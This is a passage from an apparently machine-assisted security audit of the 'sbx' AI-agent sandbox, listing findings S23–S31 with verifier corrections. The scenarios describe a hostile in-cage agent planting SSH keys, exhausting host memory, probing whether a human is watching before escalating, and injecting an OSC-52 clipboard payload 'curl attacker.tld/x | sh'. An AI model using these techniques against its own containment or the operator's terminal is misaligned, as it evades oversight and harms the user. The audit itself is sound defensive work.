In OpenSSH's `authfd.h`, 26 is `SSH_AGENTC_ADD_SMARTCARD_KEY_CONSTRAINED` — an *add*, the constrained twin of 20 (`SSH_AGENTC_ADD_SMARTCARD_KEY`, correctly filed at line 589 as "to add or drop a smartcard"). 8 and 18 are the removes; 26 is not. Type 24 (`SSH_AGENTC_ADD_RSA_ID_CONSTRAINED`, the constrained twin of 7 which *is* listed) is absent from every arm and falls through to "a request of type 24, which the broker does not know", even though it is a key-add sbx knows perfectly well. The message is refused either way, so nothing is granted; what is wrong is the record, and this function exists specifically so the record reads accurately — its own doc (574-581) explains at length how the SSH-1 spellings were mapped so that "it reads as what it is: one command, twice on the wire." The test at 1773 checks 19, 9, 17, 200 and the extension case; the test at 1069 exercises 17, 25, 18, 19, 22, 23, 20, 21, 200, 0. Neither covers 24 or 26.

**Scénario.** In-cage code attempts to plant an attacker-controlled key in the user's agent by sending `SSH_AGENTC_ADD_SMARTCARD_KEY_CONSTRAINED` (26) — the spelling `ssh-add -s <provider> -c` produces. The broker refuses it, but pushes "an attempt to remove a key from your agent" into the ring. An operator reviewing `sbx ssh-agent log` after an incident sees an attempted *removal* — noise, a confused client, nothing to chase — rather than an attempted key implant, which is the single most alarming thing this broker can observe. Pairing 26 with a type-24 attempt produces a second line reading "a request of type 24, which the broker does not know", further burying the intent.

**Correction proposée.** Split the arms to match OpenSSH's numbering: move 26 to the smartcard-add arm (`20 | 21 | 26`, or give it its own "to add a constrained smartcard key to your agent") and add 24 to the key-add arm (`7 | 17 | 24 | 25`). Extend the tests at 1069 and 1773 to cover 24 and 26 so the mapping is pinned.

**Rectification du vérificateur.** Correct as filed, and correctly scoped: the messages are refused either way (the allowlist at sshagent.rs:498-570 is closed), so nothing is granted — the defect is purely that the audit record misnames an attempted key-implant as an attempted key-removal, in the one function whose stated purpose (doc at 574-576) is that the record read accurately. Impact is on post-incident review, not on enforcement.

<details>
<summary>Preuve retenue par le vérificateur</summary>

Verified line by line. src/sandbox/sshagent.rs:583-584 read `7 | 17 | 25 => "to add a key to your agent",` / `8 | 18 | 26 => "to remove a key from your agent",` and line 589 is `20 | 21 => "to add or drop a smartcard in your agent"`. OpenSSH authfd.h numbering: 24 = SSH_AGENTC_ADD_RSA_ID_CONSTRAINED, 25 = SSH2_AGENTC_ADD_ID_CONSTRAINED, 26 = SSH_AGENTC_ADD_SMARTCARD_KEY_CONSTRAINED — so 26 is an *add* (the constrained twin of 20), mis-filed with the removes, and 24 is in no arm at all, falling through to `other => "a request of type {other}, which the broker does not know"` (line 597). It looks like a mechanical 25/26 pairing by analogy with 17/18. Reachability is clear: neither 24 nor 26 matches REQUEST_IDENTITIES (11), SIGN_REQUEST (13) or EXTENSION (27), so both land on the `_` arm at sshagent.rs:565-569 and call `refused_message_name`. No comment covers 24 or 26 — the only explanatory comment (578-581) is about the SSH-1 numbers 7/8/9. Neither test covers them: the loop at sshagent.rs:1070 uses [17, 25, 18, 19, 22, 23, 20, 21, 200, 0] and the mapping test at 1772 asserts only 19, 9, 17, 200 and the extension case.

</details>

---

### S24 — `union_fs_opt` folds `scan_max_kb` with `min`, the exact direction `fspolicy::union` documents and tests as the one that widens
| | |
|---|---|
| **Gravité** | Faible |
| **Emplacement** | `src/config/overrides.rs:685` |
| **Catégorie** | `policy-fail-open` |
| **Sous-système** | Configuration et secrets |
| **Statut** | confirmé par réfutation adversariale (confiance de l'analyste : haute) |

**Constat.** `union_fs_opt` merges the `[fs]` tables of the four override tiers and reduces `scan_max_kb` with `Some(a.min(c))`. Its doc comment (lines 660-662) claims this "folds by the rule its own layer merge uses (`crate::config::fspolicy`): the tighter ceiling wins, because a tier raising it would widen what a lower one had narrowed."

That is false in both halves. `crate::config::fspolicy` uses `Some(a.max(b))` (fspolicy.rs:108-111) and its comment states the semantics: "`scan_max_kb` is how many bytes of a file the content lens examines before letting the open through — so a bigger number closes *more* files and a smaller one closes fewer. [...] Taking the minimum therefore let a layer widen what another had narrowed". There is a dedicated regression test, `a_union_can_only_ever_widen_the_scan_window_never_shrink_it` (fspolicy.rs:411-444), whose "hostile direction" case asserts `max(64, 1) == 64`.

So the override merge applies the fixed bug's original direction, and the test at overrides.rs:2340-2342 (`assert_eq!(fs.scan_max_kb, Some(64))` for blobs setting 512 then 64) pins the wrong answer with the same false rationale. Because the merge happens before `apply_override` hands the result to `FsPolicy::union`, the shrunken value is what the invoker's intent has already been reduced to; `union`'s `max` can only restore it if some config layer independently set a larger ceiling.

**Scénario.** A team wrapper (alias, Makefile, CI job) invokes `sbx run --config @/etc/sbx/hardening.toml ...` where that file carries `[fs] scan = ["sk-[A-Za-z0-9]{20,}", "AKIA[0-9A-Z]{16}"]` and `scan_max_kb = 4096`. The developer appends one more blob to add a mask, `--config '[fs] deny = ["secrets/"]` + `scan_max_kb = 8'` — or a stale ambient `SBX_CONFIG='[fs] scan_max_kb = 1'` is present, in which case a LOWER-precedence tier beats an explicit command line. `overlay_into` folds them through `union_fs_opt`, which takes `min` and yields 8 (or 1). With no `[fs] scan_max_kb` in any config layer, the effective ceiling is 8 KiB: the content lens reads only the first 8 KiB of each file, so every `sk-...`/`AKIA...` credential past that offset in a `.env`, lockfile, or history file is handed to the cage "on the strength of its start alone" — the precise failure fspolicy.rs:99-104 describes.

**Correction proposée.** Change `Some(a.min(c))` to `Some(a.max(c))` and rewrite the doc comment to state the real semantics (a larger window closes more files, so the larger one wins), matching `fspolicy::union`. Update the test at overrides.rs:2340-2342 to expect `Some(512)` for the 512-then-64 case, mirroring fspolicy's `a_union_can_only_ever_widen_the_scan_window_never_shrink_it`.

**Rectification du vérificateur.** Severity is overstated at medium; no attacker-controlled input reaches this fold. `union_fs_opt` is only used by `overlay_into` (overrides.rs:645), which merges the four override tiers — `SBX_CONFIG`, the env fragments, `--config` blobs and CLI fragments (collect_from, overrides.rs:298-386). All four are invoker-supplied; the untrusted-project `.sbx.toml` path the fspolicy comment was written about goes through `FsPolicy::union`, which correctly takes `max`, so the hostile case that fix addressed is NOT reopened here. What survives is a genuine internal inversion plus a doc comment and a test that assert the opposite of the module they name — an invoker footgun (two of your own tiers disagreeing silently picks the wider window) and a lying comment, not a cage-driven fail-open.

<details>
<summary>Preuve retenue par le vérificateur</summary>

The code facts are exactly as stated and I found nothing that corrects the direction. src/config/overrides.rs:685 is `(Some(a), Some(c)) => Some(a.min(c))`, under a doc comment at overrides.rs:660-662 claiming it "folds by the rule its own layer merge uses (`crate::config::fspolicy`): the tighter ceiling wins". That claim is false: src/config/fspolicy.rs:109 is `(Some(a), Some(b)) => Some(a.max(b))`, and the comment at fspolicy.rs:91-108 spells out why — "a bigger number closes *more* files and a smaller one closes fewer [...] Taking the minimum therefore let a layer widen what another had narrowed" — with the regression test `a_union_can_only_ever_widen_the_scan_window_never_shrink_it` (fspolicy.rs:411-444) asserting `max(64, 1) == 64`. The polarity is independently confirmed at the consumer: `OpenPolicy` truncates content at `max_scan` (src/open_policy.rs:170-171), so a larger ceiling scans more and denies more. The overrides test at overrides.rs:2340-2342 does pin `Some(64)` with the same false rationale, and the folded value reaches the launch through `apply_fs` + `self.fs.union(over)` (src/config/mod.rs:1144-1151), where `union`'s `max` can only restore it if a config layer independently set something larger.

</details>

---

### S25 — `scan_ambient` iterates `std::env::vars()`, which panics on any non-UTF-8 environment variable
| | |
|---|---|
| **Gravité** | Faible |
| **Emplacement** | `src/config/overrides.rs:272` |
| **Catégorie** | `dos` |
| **Sous-système** | Configuration et secrets |
| **Statut** | confirmé par réfutation adversariale (confiance de l'analyste : haute) |

**Constat.** `scan_ambient` scans for the per-key `SBX_ENV_*` / `SBX_LIMIT_*` / `SBX_PACKAGE_*` prefixes with `for (k, v) in std::env::vars()`. `std::env::vars` is documented to panic if ANY variable in the environment — not just the ones being matched — has a name or value that is not valid Unicode; `std::env::vars_os` is the total form. The exact-name lookups a few lines above already use the non-panicking `std::env::var(...).ok()` (`env_nonempty`, line 292), so the panicking call is an inconsistency rather than a deliberate choice.

`collect` -> `collect_from` runs on every override-carrying command (main.rs:424 `build_override`, plus config/view.rs:992 for `sbx config show`), before anything else happens, so the panic aborts the process rather than degrading.

**Scénario.** Any user whose environment contains one variable with a non-UTF-8 byte — a locale or prompt variable written by a legacy tool, a variable holding a filename from a filesystem with mixed encodings, an `LS_COLORS`-style value pasted from a Latin-1 source — cannot run `sbx run`, `sbx app`, or `sbx config show` at all: the process panics inside `scan_ambient` before the sandbox is built, and the variable need have nothing to do with sbx. The effect is availability only (the launch fails closed, no policy is weakened), but the sandbox is unusable until the user finds and unsets an unrelated variable, and the panic message points at neither.

**Correction proposée.** Use `std::env::vars_os()` and convert per entry: skip an entry whose key is not UTF-8 (no `SBX_*` prefix can match it anyway) and, for a matched key, either skip a non-UTF-8 value or carry it lossily with a notice. One line, and it makes the scan total the way `env_nonempty` already is.

**Rectification du vérificateur.** Correct, but it is a robustness bug, not a security one, and the finding should be read that way: there is no attacker — setting a variable in the user's own environment already requires acting as that user — so this is a self-inflicted availability failure. It does fail closed (no sandbox is built, no policy is weakened). The suggested fix (`vars_os`, skipping a non-UTF-8 key since no `SBX_*` prefix can match one) is right and cheap.

<details>
<summary>Preuve retenue par le vérificateur</summary>

Verified end to end. src/config/overrides.rs:272 is `for (k, v) in std::env::vars()` and is the only `env::vars()` in the crate — every other read is the total `var_os`/`var(..).ok()` form, including `env_nonempty` eleven lines below at overrides.rs:291-293, so the panicking call is an inconsistency and no comment defends it. `std::env::vars` panics while iterating on any key or value in the environment that is not valid Unicode, and Linux environment entries are arbitrary byte strings, so the trigger need have no relation to `SBX_*`. The call is unconditional on the override path: `collect` -> `scan_ambient` at overrides.rs:242-244, reached from `build_override` (src/main.rs:423-424, used by src/cli/mod.rs:456 and src/cli/app.rs:60) and from src/config/view.rs:992 for `sbx config show`. There is no `panic::set_hook` or `catch_unwind` anywhere in the binary, so the process dies with a panic message naming neither the variable nor the remedy.

</details>

---

### S26 — `MAX_REQUEST_BYTES` undercounts by up to 3x because `from_utf8_lossy` expands each invalid byte to three
| | |
|---|---|
| **Gravité** | Faible |
| **Emplacement** | `src/sandbox/task_control.rs:894` |
| **Catégorie** | `dos` |
| **Sous-système** | Plan de contrôle et tâches déclarées |
| **Statut** | confirmé par réfutation adversariale (confiance de l'analyste : haute) |

**Constat.** `read_payloads` charges each field its request line plus its declared payload length — `held = held.saturating_add(line.len()).saturating_add(len);` (task_control.rs:884) — and refuses past `MAX_REQUEST_BYTES` (task_control.rs:162, 8 MiB). The doc on that constant (task_control.rs:150-162) states it is "the most one request may make sbx hold, keys and values together".

What is actually retained is not `len` bytes: `let value = String::from_utf8_lossy(&buf).into_owned();` (task_control.rs:894) replaces every invalid UTF-8 byte with U+FFFD, which is three bytes. A payload of `len` bytes of, say, `0xFF` is charged `len` and stored as `3 * len`. The map therefore holds up to three times the advertised ceiling, and this is the one bound standing between the cage and host memory: the doc at task_control.rs:168-171 notes the reading thread "belongs to the sbx process, **outside** the cgroup bounding the cage's own memory". `MAX_CONCURRENT_CONNS` is 32 (task_control.rs:129), and `read_payloads` runs before any admission control (`serve_run` calls it at task_control.rs:965, before `admit_quota` at 969), so the quota does not bound it either.

**Scénario.** The in-cage agent opens 32 connections to `/tmp/sbx-task.sock` (the ceiling) and on each sends `RUN anything` followed by eight fields of the form `param k<i> 1048576\n` + 1 MiB of `0xFF` + `\n`, then stops short of `run`. Each connection is charged 8 MiB and passes, while the two `BTreeMap`s on that connection's thread hold ~24 MiB of U+FFFD — about 768 MiB of supervisor RSS across the 32 connections, held for the 30-second `CAGE_FIRST_REQUEST` budget and renewable indefinitely. Nothing is logged (task_control.rs:126-128 says a refused connection is deliberately not recorded, and these are not even refused), so the host memory pressure has no attributable trace.

**Correction proposée.** Charge what is actually stored, not what was declared: compute `value` first and add `value.len()` (or `buf.iter().filter(|b| **b >= 0x80).count() * 2 + len`) to `held` before the ceiling test, or reject a payload that is not valid UTF-8 outright rather than expanding it — a parameter value that must survive byte-identical (the property `an_awkward_parameter_crosses_the_wire_byte_identical` pins) is already UTF-8 by construction on the client side, and `check_value`/`caller_env` reject NUL anyway.

**Rectification du vérificateur.** Survives, with the arithmetic corrected. Because the request LINE is charged too (`param k0 1048576\n` ≈ 18 bytes), eight 1 MiB fields overshoot the ceiling and the eighth is refused: a connection admits ~7 fields, i.e. ~7 MiB charged holding ~21 MiB of U+FFFD, so ~672 MiB across the 32 connections rather than the stated 768 MiB. Peak is slightly higher still, since `buf` (up to 1 MiB) is alive alongside the converted `value` for the duration of each iteration. The overshoot factor and the fix are as described; severity 'low' is right — the honest ceiling already permits ~256 MiB, so this is a 3x amplification of an accepted bound and a lying doc comment, not a new unbounded allocation.

<details>
<summary>Preuve retenue par le vérificateur</summary>

All three cited lines say what is claimed. `held = held.saturating_add(line.len()).saturating_add(len);` is at src/sandbox/task_control.rs:884 and the ceiling test at :885-887; the value actually stored is `String::from_utf8_lossy(&buf).into_owned()` at :894, which replaces each maximal invalid subpart with U+FFFD (3 bytes) — a run of 0xFF bytes yields one U+FFFD per byte, so exactly 3x. `MAX_PAYLOAD_BYTES = 1 << 20` (:113) and `MAX_REQUEST_BYTES = 8 * MAX_PAYLOAD_BYTES` (:162), whose doc claims it is 'the most one request may make sbx hold, keys and values together' — a property the code does not have, which by this repo's own standard is itself the finding. Ordering confirmed: `serve_run` calls `read_payloads` at :965 and only then `admit_quota` at :969, so the session call quota does not bound it. `MAX_CONCURRENT_CONNS = 32` (:129) and a refused connection is deliberately unlogged (:126-128). The reading thread is documented as being outside the cage's cgroup (:168-171). No guard prevents it.

</details>

---

### S27 — Relay rebroadcasts every host ActionInvoked/NotificationClosed into the cage, including notifications the cage never raised
| | |
|---|---|
| **Gravité** | Faible |
| **Emplacement** | `src/sandbox/notify_relay.rs:372` |
| **Catégorie** | `info-leak` |
| **Sous-système** | Ouvertures desktop (D-Bus, GPU, audio, portal) |
| **Statut** | confirmé par réfutation adversariale (confiance de l'analyste : haute) |

**Constat.** The signal pump in `run` re-emits the host daemon's `ActionInvoked` (lines 372-374) and `NotificationClosed` (lines 385-387) onto the private in-cage bus with **no filter at all**. `emit_signal(None::<&str>, …)` is a broadcast, and portal.rs:226-230 gives the private bus `<allow receive_sender="*"/>`, so any process in the cage that adds a match rule receives them.

The host daemon's signals are global: they fire for every application on the user's desktop, not for this cage. So the cage receives `(id, action_key)` for buttons the user clicks on *other* applications' notifications, and `(id, reason)` for every notification anywhere on the desktop as it closes — including sbx's own refusal toasts, raised on the host bus by `notify_sink`.

The module already holds the exact set needed to filter this (`OwnedIds`, lines 162-196), applies it to both inbound methods, and line 167 shows the author knew foreign ids reach the cage ("an id the cage guesses (or reads off a forwarded `NotificationClosed`)") — but drew only the `replaces_id` conclusion from it. The header's residual paragraph (lines 14-24) enumerates what the relay costs and this is not on the list. Filtering costs nothing functionally: the cage's own click-to-focus and action buttons are precisely the owned ids.

**Scénario.** An agent inside a `dbus = true` cage adds a match rule for `org.freedesktop.Notifications` signals on the private bus and does nothing else. It then receives, live: (a) `NotificationClosed(id, 2)` — user-dismissed — versus `(id, 1)` — expired — for every host notification, which is a presence/attention oracle telling the agent whether a human is actually at the machine right now; (b) the same signal for sbx's *own* refusal toast, confirming that its blocked request produced a toast and that the user read and dismissed it, so the agent can tell whether its probing is being watched before it escalates; (c) `ActionInvoked(id, action_key)` carrying other applications' action keys ("reply", "mark-read", "join-call"), plus the id stream itself, whose deltas count how many notifications the rest of the desktop raised between two of the cage's own — a low-bandwidth channel from any host process that can raise a notification into the cage.

**Correction proposée.** Gate both re-emissions on ownership. For `ActionInvoked`, wrap the emit in `if ours.owns(id)`. For `NotificationClosed`, evaluate `let mine = ours.owns(id);` *before* `ours.forget(id)`, then emit only when `mine`. Foreign ids stop crossing the boundary and the cage's own notification lifecycle is unaffected.

**Rectification du vérificateur.** Severity should be low, not medium. The channel carries only `(id, action_key)` and `(id, reason)` — never a summary, body, hint or app name — so the cage learns that *something* was clicked or closed and with what key, not what it said. The concrete value to a hostile agent is real but modest: a human-presence/attention oracle (dismissed=2 vs expired=1), confirmation that its own blocked request produced a toast a human then dismissed, and a monotonic id counter whose deltas count desktop-wide notification volume. "Other applications' action keys" is accurate but low-content. It is a genuine one-way host→cage channel that the module's own `OwnedIds` already computes the filter for at zero functional cost, which is what makes it worth fixing.

<details>
<summary>Preuve retenue par le vérificateur</summary>

Confirmed and unguarded. src/sandbox/notify_relay.rs:372-374 and 385-387 both call `private_conn.emit_signal(None::<&str>, …)` — `None` destination is a broadcast — with no ownership test, while every other cage-facing entry point in the module does test it (`Served::notify` at :224, `close_notification` at :253). The private bus policy permits any cage peer to receive: `<allow receive_sender="*"/>` at src/sandbox/portal.rs:229 (with `<allow send_destination="*"/>` at :228 permitting AddMatch to the bus driver), and the policy comment at portal.rs:214-217 justifies default-allow as "every peer on this bus is the same uid inside the same cage — one trust domain", which is an argument about cage-to-cage traffic, not about host signals crossing inward. The host daemon's `NotificationClosed`/`ActionInvoked` are broadcast signals matched by sender+interface+member, so the proxy at notify_relay.rs:363-364 receives them for every application on the desktop, not just this cage's. The author knew foreign ids arrive — notify_relay.rs:166-168 says an id the cage "reads off a forwarded `NotificationClosed`" names another app's notification, and the comment at :381-383 handles the foreign-close case — but drew only the `replaces_id` conclusion; the header's cost accounting at :14-24 does not list an inbound channel. The auditor's fix is correct, including the ordering detail that `owns` must be read before `forget` at :384.

</details>

---

### S28 — gpu = true binds all of /dev/dri, granting primary DRM nodes where the module header promises render nodes
| | |
|---|---|
| **Gravité** | Faible |
| **Emplacement** | `src/sandbox/gpu.rs:38` |
| **Catégorie** | `excessive-grant` |
| **Sous-système** | Ouvertures desktop (D-Bus, GPU, audio, portal) |
| **Statut** | confirmé par réfutation adversariale (confiance de l'analyste : moyenne) |

**Constat.** `DRI_DIR` is the whole `/dev/dri` directory, and launch.rs:4997-5001 pushes it onto the device grant, which becomes a `--dev-bind-try` (binds.rs:677-680) — a real device mount, not `nodev`. Everything in the directory comes with it: `renderD*` **and** `card*`.

The module header (line 14) states the grant as "the render node(s) under `/dev/dri`", and items 1 and 3 are explicitly framed as least privilege ("read-only and scoped to the GPU device directories (not all of `/sys`)"). The doc comment at lines 35-37 admits the truth — "The whole directory is granted (its `card*` and `renderD*` nodes)" — but justifies it only with the render-node use case ("a Wayland client renders offscreen on a render node and hands the buffer to the compositor"), which needs no `card*` node at all. Render nodes exist specifically so GPU access can be handed out without the primary node's KMS and GEM-flink surface; binding the directory undoes that split for no stated benefit.

The consequence is conditional but real: an unprivileged open of a `card*` node is unauthenticated while a compositor holds DRM master on that device, but `drm_open` makes the first opener of a *masterless* device the master, which unlocks modesetting and the GEM flink namespace on it.

**Scénario.** Hybrid-graphics host (Intel iGPU + discrete GPU) running an agent with `gpu = true`, `gui = "wayland"`. The compositor holds master on `card0` (the iGPU driving the internal panel); `card1` (the dGPU, possibly driving an external monitor) has no master. Code in the cage opens `/dev/dri/card1`, becomes DRM master of it, and then has KMS on that device: it can enumerate its connectors, issue `DRM_IOCTL_MODE_SETCRTC` to scan out its own buffer on the user's external display, and — now authenticated — use `DRM_IOCTL_GEM_OPEN` against that device's flink namespace to map buffer objects created by other clients on it. None of that is offscreen rendering, and none of it is what the header says `gpu = true` grants.

**Correction proposée.** Grant the render nodes rather than the directory: enumerate `/dev/dri/renderD*` in gpu.rs (a `render_nodes()` beside `drm_sys_paths()`, reusing the `is_drm_node` shape) and push those paths onto the device grant at launch.rs:4997-5001 instead of `DRI_DIR`. A `card*` node should then only be bound when a trusted config names it explicitly under `[devices]`, and the header at line 14 becomes true.

**Rectification du vérificateur.** Medium overstates it. The escalation is entirely conditional on finding a primary node with no DRM master: while a compositor holds master, an in-cage opener of `card0` is neither master nor authenticated, so every DRM_MASTER and DRM_AUTH ioctl is refused and the delta over a render node collapses to a few unauthenticated ioctls. The hybrid-graphics scenario is plausible but host-specific (a compositor that manages both GPUs takes master on both), and the flink half is empty on a device with no other clients. `gpu = true` is also trusted-only and already documented as widening kernel attack surface (docs-site/docs/guide/configuration/gpu.md:18-21). The durable, defensible core is the over-grant plus the inaccurate claim: the code hands out `card*` while gpu.rs:14 and the guide both say "render node(s)". Enumerating `renderD*` (the module already has `is_drm_node` at gpu.rs:128-135) is a small, correct fix that would make both statements true.

<details>
<summary>Preuve retenue par le vérificateur</summary>

The facts are exactly as cited and the mismatch is real. src/sandbox/gpu.rs:38 is `pub(crate) const DRI_DIR: &str = "/dev/dri";`, src/sandbox/launch.rs:4998-5001 pushes that path onto the device grant under `prep.cfg.gpu`, and src/sandbox/argv.rs:205-211 turns a `Mount::DevBind` into `--dev-bind-try <src> <dest>` — a real device mount, so both `card*` and `renderD*` come through. Against that, src/sandbox/gpu.rs:14 says the grant is "the render node(s) under `/dev/dri`", and the shipped guide repeats the narrower claim at docs-site/docs/guide/configuration/gpu.md ("**The render node(s)** under `/dev/dri`, granted through the same device-bind mechanism"). The kernel behaviour the auditor relies on is correct: `drm_file_alloc` sets `authenticated = capable(CAP_SYS_ADMIN)` (false for the cage — `capable()` resolves against the init user namespace, so bwrap's userns does not help), and `drm_master_open` makes the first opener of a device with no current master the master via `drm_new_set_master`, which sets `is_master`/`authenticated` with no capability check. So on a primary node no compositor holds master on, a cage process gets DRM_MASTER (KMS/`SETCRTC`) and DRM_AUTH (`GEM_OPEN` against that device's flink namespace) — neither of which a render node exposes.

What keeps this from being refuted as "deliberate": gpu.rs:35-37 does state the whole directory is granted, but it justifies that only with the render-node use case ("a Wayland client renders offscreen on a render node and hands the buffer to the compositor"), which needs no `card*` node — so the rationale on record does not cover the grant, and the module header plus the user-facing page state the narrower grant as fact.

</details>

---

### S29 — Raw cage stdout/stderr echoed to the launching terminal during `sbx upgrade`
| | |
|---|---|
| **Gravité** | Faible |
| **Emplacement** | `src/sandbox/launch.rs:1428` |
| **Catégorie** | `terminal-injection` |
| **Sous-système** | Pipeline de lancement et argv bwrap |
| **Statut** | confirmé par réfutation adversariale (confiance de l'analyste : haute) |

**Constat.** `upgrade_mise_packages` captures the cage's combined stdout+stderr with `run_captured` (launch.rs:1371) and prints it to the operator's terminal unfiltered: `for line in out.lines() { eprintln!("       {line}"); }` on failure (launch.rs:1427-1429), and `println!("       {ok_c}{t}{r}")` for every captured line containing " → " on success (launch.rs:1410-1412, via `mise_transitions`). `upgrade_provision_steps` does the same at launch.rs:1640-1642, and `roll_task_pool` folds the cage's last stderr line into an error string (launch.rs:1754-1761) that is printed at launch.rs:1463. `equip_announcement` (launch.rs:1169-1174, called at 4052) likewise joins its tokens raw.

This contradicts the crate's own stated doctrine. `observe_feed::sanitize` is documented as "the crate's one answer to a value the cage chooses" (observe_feed.rs:88-125) and is applied to six sinks; `mise_token_display` (launch.rs:5379-5398) applies it to the *sibling* announcement two lines above 4052 precisely because "both of the launch messages that name these tools go straight to the terminal that started sbx", and `a_hostile_mise_token_cannot_rewrite_the_launching_terminal` (launch.rs:7855) pins that behaviour. The captured-output sites are a strictly larger hole than the one that test closes: the bytes are the cage's own process output, not a config string.

**Scénario.** The cage's `mise` is `/nix/store/<hash>-mise-*/bin/mise` in the writable per-project store, so a hostile agent replaces it (see finding 1) with a program that exits non-zero after printing `\x1b[2K\r` sequences and an `\x1b]52;c;<base64>\x07` OSC-52 clipboard write. The next `sbx upgrade` runs it under `run_captured` and replays every byte through `eprintln!` at launch.rs:1428: the erase sequences scrub the `sbx: warning: … not trusted` lines sbx printed moments earlier and replace them with a forged "trusted" line, and the OSC-52 payload puts `curl attacker.tld/x | sh` in the operator's clipboard. The same reaches the terminal without any store tampering, from a remote package server: mise's registry/aqua/npm backends download and run third-party installers whose output lands in the same buffer.

**Correction proposée.** Run every captured-output line through `crate::sandbox::sanitize` before it reaches `println!`/`eprintln!` — at launch.rs:1411, 1428 and 1641, in the `roll_task_pool` error at 1756-1760, and change `equip_announcement` (launch.rs:1169-1174) to build its list with `mise_token_display` like its sibling at launch.rs:4012.

**Rectification du vérificateur.** Two corrections. The `equip_announcement` claim (launch.rs:1169-1174) is wrong: its tokens come from `packages::mise_packages`, which filters `p.state == TrustState::Trusted` (packages.rs:196-201, doc at 191-195), so those are user-approved config values, not cage- or untrusted-project-chosen ones — unlike the sibling at launch.rs:4012, which handles `auto_equip` tokens from the never-trusted `.mise.toml`. And the trojaned-mise premise is unnecessary; the ordinary path (a project-controlled token or a remote installer's output surfacing in mise's stderr) reaches line 1428 on its own. Severity is lower than 'medium' because sbx's primary path already hands the terminal to the cage wholesale — `run_status` (launch.rs:5601-5622) inherits stdio, so an interactive `sbx run` streams raw agent bytes by design. The marginal exposure is only the `sbx upgrade` report, where sbx interleaves its own trust/failure lines with cage bytes; it is a real inconsistency with the crate's stated doctrine, not a new channel.

<details>
<summary>Preuve retenue par le vérificateur</summary>

The echo sites are real and unfiltered: launch.rs:1427-1429 `for line in out.lines() { eprintln!("       {line}"); }` immediately after `crate::diag::warn(...)` at 1426; the same shape at launch.rs:1640-1642; and `roll_task_pool` folds `String::from_utf8_lossy(&run.stderr)…lines().last()` into an error string (launch.rs:1754-1761) that is printed through `roll_line` at launch.rs:1461-1464. None of them pass through `crate::sandbox::sanitize`, whose doc (observe_feed.rs:94-125) enumerates the six sinks that do and calls itself 'the crate's one answer to a value the cage chooses'. `mise_transitions` (launch.rs:5656-5662) also returns raw `&str` slices printed at launch.rs:1409-1412. So attacker-influenced bytes (an untrusted `.mise.toml` token echoed back inside mise's own failure message, or output from the third-party installers mise's aqua/npm/registry backends run) reach the operator's terminal with control sequences intact.

</details>

---

### S30 — `run_captured` buffers unbounded hostile cage output in the host-side supervisor
| | |
|---|---|
| **Gravité** | Faible |
| **Emplacement** | `src/sandbox/launch.rs:5641` |
| **Catégorie** | `dos` |
| **Sous-système** | Pipeline de lancement et argv bwrap |
| **Statut** | confirmé par réfutation adversariale (confiance de l'analyste : haute) |

**Constat.** `run_captured` uses `Command::…output()` (launch.rs:5641) and then `String::from_utf8_lossy(&out.stdout).into_owned()` plus `push_str(&…stderr)` (launch.rs:5643-5644). `output()` reads both pipes to EOF with no ceiling and no deadline, and the lossy conversion allocates a second full copy.

The cgroup limits do not cover this. `systemd-run --scope` moves *itself* into the transient scope and exec-chains into bwrap (cgroup.rs:14-18), so `MemoryMax=90%` applies to the cage — not to the sbx supervisor doing the reading. The rest of the crate applies a ceiling to exactly this data: `task::exec` reads each cage stream with `read_capped(&mut out_pipe, cap, scan_margin)` under a per-task `max_output` and an `Instant::now() >= deadline` kill (task.rs:1179-1199), and `taskpool::run` arms `INSTALL_TIMEOUT` (taskpool.rs:526-540). `run_captured` has neither.

**Scénario.** A hostile agent replaces the cage's `mise` (writable per-project store, see finding 1) with `while :; do head -c 1048576 /dev/zero | tr '\0' 'A'; done`. The operator runs `sbx upgrade`; `run_captured` at launch.rs:5641 grows two host-side allocations without bound until sbx is OOM-killed or the host starts reclaiming — and because the cage is a fork-and-wait child, killing sbx leaves the run half-done. A never-terminating command instead wedges `sbx upgrade` forever with no deadline to break it.

**Correction proposée.** Replace `Command::output()` in `run_captured` with the piped/threaded shape `task::exec` already uses: cap each stream (reuse `read_capped` or an equivalent bounded reader) and arm a wall-clock deadline that `child.kill()`s bwrap, reporting the output as truncated rather than reading to EOF.

**Rectification du vérificateur.** Real gap, overstated at medium. The consequence is confined to an operator-initiated `sbx upgrade`: the worst case is sbx being OOM-killed or hanging on its own host, with no confidentiality or integrity effect, and cgroup.rs:20-24 already frames resource limits as 'hardening, not the security control'. The store-trojan premise is also unnecessary — mise's aqua/npm/registry backends run third-party installer output into the same buffer, which is untrusted remote content by the threat model, so a chatty or never-terminating package achieves it without any tampering. Worth fixing by reusing the `read_capped` + deadline shape, but it is a robustness defect, not a security boundary failure.

<details>
<summary>Preuve retenue par le vérificateur</summary>

Verified verbatim: `match Command::new(prog).args(args).output()` at launch.rs:5641, then `String::from_utf8_lossy(&out.stdout).into_owned()` at 5643 and `push_str(&String::from_utf8_lossy(&out.stderr))` at 5644 — no cap, no deadline. The cgroup argument holds: `cgroup::wrap` (cgroup.rs:338-345) only prefixes the *child* argv with `systemd-run --scope`, which 'exec-chains into the wrapped command (it registers the scope, moves itself in, then execve's)' per cgroup.rs:14-18, so MemoryHigh/MemoryMax/TasksMax bound the cage, never the sbx process doing the read. The contrast with `task::exec` is accurate — task.rs:1181-1199 spawns per-stream `read_capped(&mut out_pipe, cap, scan_margin)` threads under `task.max_output` and kills the child at `Instant::now() >= deadline`. `run_captured` has neither, and its only callers are launch.rs:1371 and launch.rs:1615, both on the `sbx upgrade` path.

</details>

---

### S31 — `cage_scope_dirs` walks every user's slice, not this user's — contrary to its own doc
| | |
|---|---|
| **Gravité** | Faible |
| **Emplacement** | `src/sandbox/cgroup.rs:372` |
| **Catégorie** | `cross-user-confusion` |
| **Sous-système** | Pipeline de lancement et argv bwrap |
| **Statut** | confirmé par réfutation adversariale (confiance de l'analyste : moyenne) |

**Constat.** The doc comment reads "Every cage scope's cgroup directory **under this user's slice**" (cgroup.rs:362), but the walk is rooted at `/sys/fs/cgroup/user.slice` (cgroup.rs:372) — the parent of *every* `user-<uid>.slice` on the host. The uid is never consulted, even though `delegated_controllers` right above it already calls `libc::getuid()` for exactly this purpose (cgroup.rs:190). Those directories are world-readable on a normal systemd host, so on any multi-user machine the returned list mixes other uids' cage scopes with this user's.

